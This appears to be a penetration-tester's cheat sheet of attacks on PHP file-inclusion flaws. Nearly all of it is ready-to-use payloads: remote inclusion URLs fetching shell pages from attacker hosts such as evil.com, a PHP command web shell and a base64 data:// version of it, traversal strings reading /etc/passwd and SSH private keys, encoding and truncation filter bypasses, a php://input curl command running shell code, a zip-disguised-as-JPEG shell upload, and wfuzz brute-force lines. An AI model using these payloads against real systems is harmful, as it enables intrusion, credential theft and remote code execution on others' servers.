##################################################################################
=== RFI-php (remote-file-inclusion) ===
[!] Only works if allow_url_fopen & allow_url_include is [ON].
[!] php 5.2+ [Off] by default.

assumes the target has a vulnerable parameter such as page=<data>
http://<target_web_ip>/VulnWebApp/LFI-RFI/LFI.php?page=http://<attacker_ip>/<evil_page>

[1] e.g:
http://192.168.1.1/WebApp/test?page=http://192.168.5.5/info.php
where info.php contains (check disable_functions):
<?php phpinfo(); ?>

[2] e.g:
http://192.168.1.1/WebApp/test?page=http://192.168.5.5/rev.php&cmd=<command>
where rev.php contains:
<?php system($_GET['cmd']); ?>

- null byte -
http://example.com/index.php?page=http://evil.com/shell.txt%00

- double encoding -
http://example.com/index.php?page=http:%252f%252fevil.com%252fshell.txt

- windows smb -
(When allow_url_include and allow_url_fopen are set to Off. It is still possible to include a remote page on Windows box using the smb protocol.)

1. Create a share open to everyone
2. Write a PHP code inside a page : shell.php
3. Include it http://example.com/index.php?page=\\10.0.0.1\share\shell.php
##################################################################################
=== LFI(local-file-inclusion) ===
assumes the target has a vulnerable parameter such as page=<data>
http://<target_web_ip>/VulnWebApp/LFI-RFI/LFI.php?page=<page_to_read>

[1] e.g:
http://192.168.1.1/WebApp/test?page=../../../../etc/passwd
http://192.168.1.1/WebApp/test?page=../../../../home/user/.ssh/id_rsa

- [!] If target sanatises input such as the ones above -
- null byte -
page=../../../etc/passwd%00

- double encoding -
page=%252e%252e%252fetc%252fpasswd
page=%252e%252e%252fetc%252fpasswd%00

- UTF-8 encoding -
page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd%00

- path and dot truncation -
(On most PHP installations a pagename longer than 4096 bytes will be cut off so any excess chars will be thrown away.)
page=../../../etc/passwd............[ADD MORE]
page=../../../etc/passwd\.\.\.\.\.\.[ADD MORE]
page=../../../etc/passwd/./././././.[ADD MORE]
page=../../../[ADD MORE]../../../../etc/passwd

- filter bypass trick -
page=....//....//etc/passwd
page=..///////..////..//////etc/passwd
page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
##################################################################################
=== LFI/RFI (using wrappers) ===
http://<site>/index.php?page=php://filter/read=string.rot13/resource=index.php
http://<site>/index.php?page=php://filter/convert.iconv.utf-8.utf-16/resource=index.php
http://<site>/index.php?page=php://filter/convert.base64-encode/resource=index.php
http://<site>/index.php?page=pHp://FilTer/convert.base64-encode/resource=index.php

- Wrappers can be chained with a compression wrapper for large pages -
http://example.com/index.php?page=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd

- Wrapper data:// -
http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"

- Wrapper input:// -
(Specify your payload in the POST parameters, this can be done with a simple curl command.)
curl -X POST --data "<?php echo shell_exec('id'); ?>" "https://example.com/index.php?page=php://input%00" -k -v

- Wrapper zip:// -
1. Create an evil payload: echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;
2. Zip the file

zip payload.zip payload.php;
mv payload.zip shell.jpg;
rm payload.php

3. Upload the archive and access the file using the wrappers: http://example.com/index.php?page=zip://shell.jpg%23payload.php

- Wrapper phar:// -

##################################################################################
=== brute force LFI ===
wfuzz -c -z file,/path/to/wordlist http://192.168.1.1/WebApp/LFI.php?page=../../../../FUZZ
wfuzz -c -z file,/path/to/wordlist http://192.168.1.1/WebApp/LFI.php?page=FUZZ
##################################################################################
